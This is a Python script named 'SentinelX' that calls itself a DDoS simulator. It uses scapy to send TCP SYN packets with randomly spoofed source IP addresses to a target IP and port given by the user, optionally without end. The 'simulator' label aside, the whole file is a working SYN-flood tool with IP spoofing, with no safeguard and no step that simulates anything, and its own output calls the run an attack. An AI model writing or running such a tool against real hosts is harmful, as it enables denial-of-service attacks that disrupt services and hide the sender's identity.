import argparse
import time
import random
from scapy.all import IP, TCP, send

parser = argparse.ArgumentParser(description="SentinelX - Distributed Denial of Service (DDoS) Simulator")
parser.add_argument("--target", required=True, help="Target IP address")
parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
parser.add_argument("--count", type=int, default=500, help="Number of packets to send (0 for infinite)")
parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets")
args = parser.parse_args()

def generate_random_ip():
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

print(f"[*] Starting DDoS Simulation against {args.target}:{args.port}")
if args.count == 0:
    print(f"[*] Spoofing random IPs indefinitely with {args.delay}s delay... (Press Ctrl+C to stop)")
else:
    print(f"[*] Spoofing {args.count} random IPs with {args.delay}s delay...")

try:
    sent = 0
    while args.count == 0 or sent < args.count:
        fake_ip = generate_random_ip()
        packet = IP(dst=args.target, src=fake_ip)/TCP(dport=args.port, flags="S")
        send(packet, verbose=0)
        sent += 1
        
        # Print progress every 100 packets so the user knows it's working
        if sent % 100 == 0:
            print(f"    [~] Sent {sent} packets from spoofed IPs...")
            
        if args.delay > 0:
            time.sleep(args.delay)
            
    print(f"\n[+] DDoS simulation completed. Sent {sent} packets from randomized source IPs.")
except KeyboardInterrupt:
    print(f"\n[!] Attack aborted by user. Sent {sent} packets.")
except Exception as e:
    print(f"\n[!] Error: {e}")
